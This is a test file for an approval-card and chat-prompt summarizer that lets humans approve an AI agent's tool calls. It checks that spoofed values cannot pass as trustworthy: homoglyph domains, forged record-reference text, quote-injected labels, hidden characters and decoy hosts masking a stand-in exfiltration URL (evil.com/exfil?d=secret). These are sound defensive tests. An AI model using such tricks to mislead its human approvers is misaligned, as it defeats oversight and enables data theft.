import { beforeAll, describe, expect, it } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import { domainToASCII } from "node:url";

import { ApprovalCard } from "../approval-card";
import { PROMPT_HOST_MAX } from "@/lib/approvals/prompt";
import { buildApprovalPrompt, summarizeArgs } from "@/test-helpers/approvals";
import { makeRefResolver } from "@/lib/approvals/call-models";
import { renderText, summarizeCall, type SummarizeOptions } from "@/lib/approvals/summary";
import {
  ASTRAL_COST,
  DRAW_BUDGET,
  FULL_VIEW_KEYS,
  WHOLE_MAX,
  displayScalar,
  quoted,
  secretText,
} from "@/lib/approvals/display";
// pinchy-odoo's own encoder, so the refs below are real ones — see
// call-models.test.ts for why this crosses the package boundary.
import { encodeRef, _resetKeyCacheForTest } from "../../../../plugins/pinchy-odoo/integration-ref";

const REF_KEY = "c".repeat(64);
let options: SummarizeOptions;
let acmeRef: string;

beforeAll(() => {
  process.env.PINCHY_REF_TOKEN_KEY = REF_KEY;
  _resetKeyCacheForTest();
  options = { refRecord: makeRefResolver(REF_KEY) };
  acmeRef = encodeRef({
    integrationType: "odoo",
    connectionId: "c1",
    model: "res.partner",
    id: 7,
    label: "Acme GmbH",
  });
});

/** The card as the approver's browser receives it, collapsed. */
function card(params: Record<string, unknown>): string {
  return renderToStaticMarkup(
    <ApprovalCard
      approval={{
        id: "req-1",
        agentId: "a1",
        agentName: "Smithers",
        toolName: "t",
        argsSummary: summarizeArgs(params, options),
        sessionKey: "agent:a1:direct:u",
        createdAt: "",
        expiresAt: "",
      }}
      busy={false}
      onDecide={() => {}}
    />
  );
}

/** The chat-channel prompt's description. A tool no registry knows, so the
 * lead stays short and the arguments fit in the 256 characters. */
function prompt(params: Record<string, unknown>): string {
  const built = buildApprovalPrompt("t", params, [], options);
  if ("exceeded" in built) throw new Error(`refused: ${JSON.stringify(built.exceeded)}`);
  return built.description;
}

/** Drops every tag, character by character. React's static markup escapes
 * `<` inside text, so any `<` here opens a tag. */
function stripTags(html: string): string {
  let out = "";
  let inTag = false;
  for (const ch of html) {
    if (ch === "<") inTag = true;
    else if (ch === ">" && inTag) inTag = false;
    else if (!inTag) out += ch;
  }
  return out;
}

function decode(html: string): string {
  return stripTags(html)
    .replace(/&quot;/g, '"')
    .replace(/&#x27;/g, "'")
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&amp;/g, "&");
}

/** What a person reads on the card: its text, tags removed. */
function visibleText(html: string): string {
  return decode(html);
}

/** The text run of the first value on the card — the value's own characters,
 * without anything drawn beside it. */
function valueText(html: string): string {
  const run = /<span class="whitespace-pre-wrap">(.*?)<\/span>/.exec(html);
  return run ? decode(run[1]) : "";
}

/** How a plain string's own characters are drawn. */
function drawnAs(value: string): string {
  return displayScalar(renderText(value));
}

/**
 * Written INTO the value's text, Pinchy's own annotations — the record a ref
 * decodes to, the host an address really reaches — would make a value holding
 * the same characters indistinguishable from the annotated one, on the card
 * and in the prompt alike: pinchy-odoo
 * resolves a plain string by exact NAME, so `partner_id: '(record reference:
 * res.partner #7 "Acme GmbH")'` books the bill to an attacker-created partner
 * of that literal name, under a card that reads exactly like the real ref.
 *
 * So annotations travel out of band: a separate node in the summary, a
 * separate element on the card, text outside the quotes in the prompt. A
 * plain string can produce none of the three.
 */
describe("an annotation can't be imitated by a value", () => {
  const pairs: [string, () => Record<string, unknown>, () => Record<string, unknown>][] = [
    [
      "a record reference and the text that spells it out",
      () => ({ partner_id: acmeRef }),
      () => ({ partner_id: '(record reference: res.partner #7 "Acme GmbH")' }),
    ],
    [
      "a homoglyph address and the same address with its note typed after it",
      () => ({ email: "boss@f\u0456rma.at" }),
      () => ({ email: "boss@f\u0456rma.at (xn--frma-l9d.at)" }),
    ],
    [
      "a homoglyph address and one with a reassuring ASCII host typed after it",
      () => ({ email: "boss@f\u0456rma.at" }),
      () => ({ email: "boss@f\u0456rma.at (firma.at)" }),
    ],
    [
      "a percent-encoded URL and the URL with its host typed after it",
      () => ({ website: "https://fir%6Da.at/" }),
      () => ({ website: "https://fir%6Da.at/ (firma.at)" }),
    ],
    [
      "a recipient with a display name and an address with the name typed after it",
      () => ({ to: '"X" <a@b.com>' }),
      () => ({ to: 'a@b.com (name: "X")' }),
    ],
  ];

  it.each(pairs)("draws %s differently on the card", (_name, annotated, typed) => {
    expect(card(typed())).not.toBe(card(annotated()));
  });

  it.each(pairs)("prints %s differently in the prompt", (_name, annotated, typed) => {
    const a = prompt(annotated());
    const b = prompt(typed());
    expect(a.length).toBeLessThan(256);
    expect(b.length).toBeLessThan(256);
    expect(b).not.toBe(a);
  });

  // The typed characters stay in the value's own text run — whatever else is
  // drawn beside it is about that value, never part of it.
  it.each(pairs)("draws the typed one of %s as its own text", (_name, annotated, typed) => {
    expect(card(annotated())).toContain("data-annotation=");
    const [value] = Object.values(typed()) as string[];
    expect(valueText(card(typed()))).toBe(drawnAs(value));
  });

  it("names no record for the typed reference, and no host for the forged notes", () => {
    for (const typed of [
      { partner_id: '(record reference: res.partner #7 "Acme GmbH")' },
      { email: "boss@f\u0456rma.at (xn--frma-l9d.at)" },
      { email: "boss@f\u0456rma.at (firma.at)" },
    ]) {
      expect(card(typed)).not.toContain("data-annotation=");
    }
  });

  // The prompt quotes every string and escapes its `"`, so a value is one
  // quoted token that can't close early. An annotation sits OUTSIDE it.
  it("prints a record reference outside any quotes, and the typed text inside them", () => {
    expect(prompt({ partner_id: acmeRef })).toContain(
      'partner_id: (record reference: res.partner #7 "Acme GmbH")'
    );
    expect(prompt({ partner_id: '(record reference: res.partner #7 "Acme GmbH")' })).toContain(
      'partner_id: "(record reference: res.partner #7 \\"Acme GmbH\\")"'
    );
  });

  it("prints a host note after the quoted address, and a typed one inside the quotes", () => {
    expect(prompt({ email: "boss@f\u0456rma.at" })).toContain(
      'email: "boss@f\u0456rma.at" (host: "xn--frma-l9d.at")'
    );
    expect(prompt({ email: "boss@f\u0456rma.at (firma.at)" })).toContain(
      'email: "boss@f\u0456rma.at (firma.at)"'
    );
  });
});

/**
 * Past the whole-view bound a URL is previewed like any long text. Written at
 * the END of the text, a host note would sit behind "Show full text" —
 * exactly where a homoglyph host needs it most.
 */
describe("a host note past the whole-view bound", () => {
  it("is on the collapsed card, outside the preview", () => {
    const html = card({ website: `https://f\u0456rma.at/invoices?id=${"a".repeat(8_200)}` });
    expect(html).toMatch(/Show full text/);
    expect(visibleText(html)).toContain("xn--frma-l9d.at");
  });

  it("is on the collapsed card for a long email address too", () => {
    const html = card({ email: `rechnungen.${"x".repeat(8_200)}@f\u0456rma.at` });
    expect(html).toMatch(/Show full text/);
    expect(visibleText(html)).toContain("xn--frma-l9d.at");
  });
});

/**
 * A record's label comes from Odoo, where anyone
 * who can name a partner writes it. Drawn between bare `"`, the label
 * `x" — res.partner #12 "Acme GmbH` made the card read as naming #12 while
 * the prompt, which escapes it, did not.
 */
describe("a record label that holds quotes", () => {
  const label = 'x" — res.partner #12 "Acme GmbH';
  let forgedRef: string;
  beforeAll(() => {
    forgedRef = encodeRef({
      integrationType: "odoo",
      connectionId: "c1",
      model: "res.partner",
      id: 666,
      label,
    });
  });

  it("is quoted and escaped on the card exactly as in the prompt", () => {
    const html = card({ partner_id: forgedRef });
    expect(html).toContain('data-annotation="ref"');
    expect(visibleText(html)).toContain(`res.partner #666 ${quoted(label)}`);
    expect(prompt({ partner_id: forgedRef })).toContain(`res.partner #666 ${quoted(label)}`);
  });
});

/**
 * Past the whole-view bound the host of an address sits behind "Show full
 * text". Named only where it reads differently from what it resolves to — an
 * ASCII host never does — two long addresses that differ only in where they
 * go would draw the same card. Past the bound, the host is always named.
 */
describe("a long address with a plain ASCII host", () => {
  const pad = "intranet.firma.at.".repeat(470);
  const cases: [string, (host: string) => Record<string, unknown>][] = [
    ["an email address", (host) => ({ email: `buchhaltung.${pad}@${host}` })],
    ["a URL", (host) => ({ website: `https://${pad}@${host}/x` })],
    ["a recipient", (host) => ({ to: `buchhaltung.${pad}@${host}` })],
  ];

  it.each(cases)("names the host of %s on the collapsed card", (_name, params) => {
    const evil = card(params("evil.example"));
    const look = card(params("firma.at.xyz"));
    expect(evil).toMatch(/Show full text/);
    expect(evil).not.toBe(look);
    expect(evil).toContain('data-annotation="host"');
    expect(visibleText(evil)).toContain("host evil.example");
    expect(visibleText(look)).toContain("host firma.at.xyz");
  });

  it("is not named for an address short enough to be drawn whole", () => {
    expect(card({ email: "buchhaltung@evil.example" })).not.toContain("data-annotation=");
  });
});

/** A seeded generator, so a failure reproduces. */
function random(seed: number): () => number {
  let state = seed;
  return () => {
    state = (state * 1_103_515_245 + 12_345) % 2_147_483_648;
    return state / 2_147_483_648;
  };
}

/**
 * The general claim behind the pairs above: no plain string, at any key,
 * produces the card or the prompt of an annotated value. The candidates are
 * built from the annotated renderings themselves — their visible text, their
 * prompt clause with and without its quotes — plus random strings over the
 * characters the annotations are written in.
 */
describe("no plain string renders like an annotated value", () => {
  /** Annotated values, by key. `to` is parsed into address and display name,
   * so a typed `<…>` there is a real display name — it is compared, not
   * required to stay unannotated. */
  const annotatedValues = (): [string, string][] => [
    ["v", acmeRef],
    ["v", "boss@f\u0456rma.at"],
    ["v", "https://f\u0456rma.at\\@evil.com/x"],
    ["v", "https://fir%6Da.at/"],
    // The parser refuses `http://[::1/`, so it is not a URL and gets no note;
    // these shapes it accepts, and each reaches a host the text doesn't show.
    ["v", "https:f\u0456rma.at/x"],
    ["v", "https://firma.at@evil.com/x"],
    ["v", "Boss <boss@f\u0456rma.at>"],
    ["to", '"Raimund Korber" <attacker@evil.com>'],
    ["to", '"Boss" <boss@f\u0456rma.at>'],
  ];

  const ALPHABET = [
    ..."()\"'#:@./- \\[]<>",
    "record reference",
    "res.partner",
    "Acme GmbH",
    "xn--frma-l9d.at",
    "firma.at",
    "f\u0456rma.at",
    "boss",
    "host",
    "name",
    "not a valid domain name",
    "7",
  ];

  function candidates(text: string, clause: string): string[] {
    const value = clause.slice(clause.indexOf(": ") + 2);
    return [
      text,
      value,
      value.replace(/^"|"$/g, ""),
      value.replace(/\\(["\\])/g, "$1"),
      value.replace(/^"/, "").replace(/\\(["\\])/g, "$1"),
    ];
  }

  function expectApart(key: string, value: string, plain: string) {
    const annotatedCard = card({ [key]: value });
    const annotatedPrompt = prompt({ [key]: value });
    const typedCard = card({ [key]: plain });
    expect(typedCard).not.toBe(annotatedCard);
    expect(prompt({ [key]: plain })).not.toBe(annotatedPrompt);
    // A recipient field parses `"Name" <address>`, so there a typed name IS
    // a display name; everywhere else the typed characters are the value.
    if (key !== "to") expect(valueText(typedCard)).toBe(drawnAs(plain));
  }

  it("for the renderings of every annotated value", () => {
    for (const [key, value] of annotatedValues()) {
      const annotatedPrompt = prompt({ [key]: value });
      const clause = annotatedPrompt.slice(annotatedPrompt.indexOf(`${key}: `));
      for (const plain of candidates(visibleText(card({ [key]: value })), clause)) {
        expectApart(key, value, plain);
      }
    }
  });

  it("for random strings over the annotations' own characters", () => {
    const next = random(1242);
    for (let round = 0; round < 300; round++) {
      const length = 1 + Math.floor(next() * 8);
      let plain = "";
      for (let i = 0; i < length; i++) plain += ALPHABET[Math.floor(next() * ALPHABET.length)];
      for (const [key, value] of annotatedValues()) {
        if (plain !== value) expectApart(key, value, plain);
      }
    }
  });

  it("for the text a hidden secret is described with", () => {
    const typed = { note: "[secret-like field is being set — value hidden, 3 characters]" };
    expect(card(typed)).not.toContain("data-annotation=");
    expect(card({ access_token: "abc" })).toContain("data-annotation=");
    expect(prompt(typed)).toContain('note: "[secret-like');
    expect(prompt({ access_token: "abc" })).toContain("access_token: [secret-like");
  });
});

/**
 * The summary names a host beside every value it previews. Whether a value is
 * previewed is one decision (`shownAs`): asked a second time, from a
 * different reading of the value, a run of hidden characters (`⟨4 × U+200B⟩`,
 * which holds spaces) or a URL with text after it could be previewed as text
 * while counted as an address drawn whole, with no host named — the real
 * domain past the preview, behind "Show full text", in the card and in the
 * prompt alike. Each pair differs only in that domain.
 */
describe("the host a value reaches, when the card previews it", () => {
  const pad = "a".repeat(190);
  const pairs: [string, (tld: string) => Record<string, unknown>][] = [
    [
      "a URL ending in a run of hidden characters",
      (tld) => ({
        values: { website: `https://www.firma.at.${pad}.evil.${tld}/x${"​".repeat(4)}` },
      }),
    ],
    [
      "an address with a run of hidden characters in its local part",
      (tld) => ({ values: { email: `bo${"​".repeat(4)}ss@firma.at.${pad}.evil.${tld}` } }),
    ],
    [
      "an address that reads as a JSON string, just under the whole-view bound",
      (tld) => {
        // Quoted on the card (`displayScalar`), it grows past 8,192 characters.
        const tail = `@firma.at.evil.${tld}"`;
        return { values: { email: `"${"a".repeat(8_190 - 1 - tail.length)}${tail}` } };
      },
    ],
    [
      "a URL the parser accepts with words after it",
      (tld) => ({
        values: { website: `https://www.firma.at.${"a".repeat(180)}.evil.${tld}/ Neue Website` },
      }),
    ],
  ];

  it.each(pairs)("draws %s with its host on the collapsed card", (_name, params) => {
    const evil = card(params("com"));
    const other = card(params("org"));
    expect(evil).toMatch(/Show full text/);
    expect(evil).not.toBe(other);
    expect(evil).toContain('data-annotation="host"');
    expect(visibleText(evil)).toContain(".evil.com");
    expect(visibleText(other)).toContain(".evil.org");
  });

  it.each(pairs)("prints %s with the end of its host in the prompt", (_name, params) => {
    expect(prompt(params("com"))).toContain(".evil.com");
    expect(prompt(params("org"))).toContain(".evil.org");
  });
});

/**
 * The general claim: whatever a hostile value is wrapped in — a run of hidden
 * characters, the quotes that make it read as a JSON string, padding, words
 * after a URL — and whatever its length around the two bounds that decide a
 * preview, the collapsed card and the prompt both show the end of the host
 * the tool would reach. The host is resolved here independently, with the
 * URL parser the tools use and the address's own domain.
 */
describe("the host a value reaches is always on the collapsed card and in the prompt", () => {
  /** The host, resolved without the summary's help; null when nothing is reached. */
  function resolvedHost(value: string): string | null {
    try {
      const url = new URL(value);
      if (url.protocol === "https:") return url.hostname;
    } catch {
      // not a URL; maybe an address
    }
    const trimmed = value.trim();
    const address = /^[^<>]*<([^<>]*)>$/.exec(trimmed)?.[1] ?? trimmed;
    if (/[\s,;<>]/.test(address) || address.split("@").length !== 2) return null;
    return domainToASCII(address.slice(address.indexOf("@") + 1)) || null;
  }

  /** How a surface prints a string: as it is, or escaped inside quotes. */
  function printed(text: string, host: string): boolean {
    return text.includes(host) || text.includes(quoted(host).slice(1, -1));
  }

  const RUNS = ["​", "⠀", " ", "‍", " "];
  const KEYS: string[][] = [["values", "website"], ["values", "email"], ["url"], ["to"], ["note"]];

  function hostile(next: () => number): { params: Record<string, unknown>; value: string } {
    const pick = <T,>(items: T[]): T => items[Math.floor(next() * items.length)];
    const near = pick([200, 8_192]);
    const tld = pick(["com", "org", "net", "io"]);
    const host = `www.firma.at.${"a".repeat(Math.max(0, near - 60 + Math.floor(next() * 120)))}.evil.${tld}`;
    const run = pick(RUNS).repeat(1 + Math.floor(next() * 6));
    const mailbox = next() < 0.5;
    let value = mailbox
      ? `${next() < 0.5 ? `bo${run}ss` : "boss"}@${host}`
      : `https://${host}/x${next() < 0.5 ? run : ""}`;
    if (mailbox && next() < 0.3) value = `Boss <${value}>`;
    if (!mailbox && next() < 0.3) value += " Neue Website";
    if (next() < 0.3) value = `"${value}"`;
    if (next() < 0.2) value = ` ${value}`;
    // A recipient field is read as addresses: a URL there reaches nothing.
    const keys = pick(mailbox ? KEYS : KEYS.filter(([key]) => key !== "to"));
    const params = keys.length === 2 ? { [keys[0]]: { [keys[1]]: value } } : { [keys[0]]: value };
    return { params, value };
  }

  it("for generated hostile values", () => {
    const next = random(1_242_017);
    let checked = 0;
    for (let round = 0; round < 400; round++) {
      const { params, value } = hostile(next);
      const host = resolvedHost(value);
      if (host === null) continue;
      checked++;
      const text = visibleText(card(params));
      const description = prompt(params);
      if (!printed(text, host)) {
        expect.fail(`the collapsed card for ${JSON.stringify(params)} hides ${host}`);
      }
      if (!printed(description, host.slice(-PROMPT_HOST_MAX))) {
        expect.fail(`the prompt ${JSON.stringify(description)} hides the end of ${host}`);
      }
    }
    expect(checked).toBeGreaterThan(250);
  });
});

/**
 * The summary refuses a call whose collapsed card would cost more than
 * DRAW_BUDGET to draw: one for every key, value and note the card draws, one
 * for each of their characters, ASTRAL_COST for a character outside the Basic
 * Multilingual Plane. That bound holds only if the summary counts what the
 * card draws: whole values, previews by their preview, display names, record
 * labels, field names, host notes, numbers, empty lists and hidden secrets
 * alike. So for each place, a call that brings the card to exactly the bound
 * is accepted, and drawn with exactly the characters counted for that place;
 * one more is refused, and the refusal reports the exact cost.
 */
describe("the card draws exactly what the summary counts", () => {
  const flag = "\u{1F3F3}";
  /** The card as drawn, without the copy read to assistive technology. */
  const drawn = (html: string) =>
    html.replace(/<(bdo|span)[^>]*class="sr-only[^"]*"[^>]*>.*?<\/\1>/g, "");
  const occurrences = (html: string, char: string) =>
    [...decode(drawn(html))].filter((c) => c === char).length;
  const label = (labelText: string) =>
    encodeRef({
      integrationType: "odoo",
      connectionId: "c1",
      model: "res.partner",
      id: 9,
      label: labelText,
    });

  /** Each place: its arguments (built when the test runs, after the ref key
   * is set), what they cost, and the character drawn there with how many of
   * it the card must draw (`null`: nothing to probe). */
  const places: [string, () => Record<string, unknown>, number, [string, number] | null][] = [
    [
      "a short value",
      () => ({ note: flag.repeat(10) }),
      1 + 4 + (1 + 10 * ASTRAL_COST),
      [flag, 10],
    ],
    [
      "a previewed text, by its preview",
      () => ({ note: flag.repeat(30) + "b".repeat(900) }),
      1 + 4 + (1 + 30 * ASTRAL_COST + 170),
      [flag, 30],
    ],
    [
      "a recipient's display name",
      () => ({ to: `"${flag.repeat(3)}" <a@firma.at>` }),
      1 + 2 + (1 + 10) + (1 + 3 * ASTRAL_COST),
      [flag, 3],
    ],
    [
      "a record label",
      () => ({ partner_id: label(flag.repeat(5)) }),
      // `res.partner #9 "…"`, one element.
      1 + 10 + (1 + 15 + 2 + 5 * ASTRAL_COST),
      [flag, 5],
    ],
    ["a field name", () => ({ ["q".repeat(50)]: null }), 1 + 50 + (1 + 4), ["q", 50]],
    [
      "a host note",
      () => ({ site: "https://%71%71%71%71.at/" }),
      1 + 4 + (1 + 24) + (1 + "qqqq.at".length),
      ["q", 4],
    ],
    ["a number", () => ({ count: 123_456_789 }), 1 + 5 + (1 + 9), null],
    ["an empty list", () => ({ none: [] }), 1 + 4 + (1 + 2), null],
    [
      "a hidden secret",
      () => ({ api_key: "s3cr3t" }),
      1 + 7 + (1 + secretText({ "@": "secret", length: 6 }).length),
      null,
    ],
  ];

  it.each(places)("counts %s", (_name, place, cost, probe) => {
    for (const extra of [0, 1]) {
      // Fill the rest of the bound with two targets drawn whole: `targets`,
      // as many letters as one may hold, and as many as the place leaves.
      const rest = DRAW_BUDGET - (1 + 7) - (1 + WHOLE_MAX) - 1 - cost + extra;
      expect(rest).toBeGreaterThan(0);
      expect(rest).toBeLessThanOrEqual(WHOLE_MAX);
      const params = { targets: ["a".repeat(WHOLE_MAX), "a".repeat(rest)], ...place() };
      const { exceeded } = summarizeCall(params, options);
      if (extra === 0) {
        expect(exceeded).toBeNull();
        if (probe) expect(occurrences(card(params), probe[0])).toBe(probe[1]);
      } else {
        expect(exceeded).toEqual({
          kind: "too-costly-to-draw",
          cost: DRAW_BUDGET + 1,
          limit: DRAW_BUDGET,
        });
      }
    }
  });
});

/**
 * Every host a call reaches is named in the prompt, or the call is refused —
 * whatever the call is wrapped in. A tool that read only `url` once got
 * decoys under `target`, `destination` and `targets` ahead of it, which took
 * the room the prompt has for hosts, and the host the tool fetched was the one
 * left out. Here many values reach many hosts, under every key that is drawn
 * whole and under ordinary ones, in any key order; the hosts are resolved
 * independently, with the URL parser the tools use and the address's own
 * domain.
 */
describe("every host a call reaches is in the prompt, or the call is refused", () => {
  function hostOf(value: string): string | null {
    try {
      const url = new URL(value);
      if (url.protocol === "https:") return url.hostname;
    } catch {
      // an address
    }
    return value.includes("@") ? domainToASCII(value.slice(value.lastIndexOf("@") + 1)) : null;
  }

  const KEYS = [...FULL_VIEW_KEYS, "website", "email", "note", "values"];

  function call(next: () => number): { params: Record<string, unknown>; hosts: string[] } {
    const pick = <T,>(items: T[]): T => items[Math.floor(next() * items.length)];
    // A recipient field is read as addresses — a URL there reaches nothing —
    // so it gets addresses only.
    const value = (recipient: boolean) => {
      const pad = next() < 0.3 ? `${"a".repeat(60 + Math.floor(next() * 120))}.` : "";
      const host = `${pad}s${Math.floor(next() * 40)}.${pick(["firma.at", "evil.com", "evil.org"])}`;
      return recipient || next() < 0.5 ? `boss@${host}` : `https://${host}/x`;
    };
    // Any order, repeats included: a later key of the same name replaces it.
    const keys = Array.from({ length: 1 + Math.floor(next() * 6) }, () => pick(KEYS));
    const params: Record<string, unknown> = {};
    for (const key of keys) {
      const recipient = /^(to|cc|bcc)$/.test(key);
      params[key] =
        next() < 0.4
          ? Array.from({ length: 1 + Math.floor(next() * 25) }, () => value(recipient))
          : value(recipient);
    }
    const sent = Object.values(params).flatMap((v) => (Array.isArray(v) ? v : [v])) as string[];
    return { params, hosts: [...new Set(sent.map(hostOf).filter((h): h is string => !!h))] };
  }

  it("for generated calls with many hosts and decoys", () => {
    const next = random(1_242_018);
    let named = 0;
    let refused = 0;
    for (let round = 0; round < 600; round++) {
      const { params, hosts } = call(next);
      const prompt = buildApprovalPrompt("pinchy_web_fetch", params, [], options);
      if ("exceeded" in prompt) {
        expect(prompt.exceeded).toEqual({ kind: "too-many-hosts", count: expect.any(Number) });
        refused++;
        continue;
      }
      named++;
      for (const host of hosts) {
        const end = host.slice(-PROMPT_HOST_MAX);
        if (!prompt.description.includes(end)) {
          expect.fail(`the prompt ${JSON.stringify(prompt.description)} hides ${host}`);
        }
      }
    }
    // Both outcomes are exercised, or the claim proves nothing.
    expect(named).toBeGreaterThan(100);
    expect(refused).toBeGreaterThan(100);
  });

  it("refuses the decoy calls, in either key order", () => {
    const decoys = [
      {
        target: `https://${"a".repeat(120)}.firma.at/`,
        destination: `https://${"b".repeat(120)}.firma.at/`,
        url: "https://evil.com/exfil?d=secret",
      },
      {
        targets: Array.from({ length: 25 }, (_, i) => `https://s${i}.firma.at/`),
        url: "https://evil.com/x",
      },
    ];
    for (const params of decoys) {
      for (const order of [params, Object.fromEntries(Object.entries(params).reverse())]) {
        expect(buildApprovalPrompt("pinchy_web_fetch", order, [], options)).toEqual({
          exceeded: { kind: "too-many-hosts", count: expect.any(Number) },
        });
      }
    }
  });
});
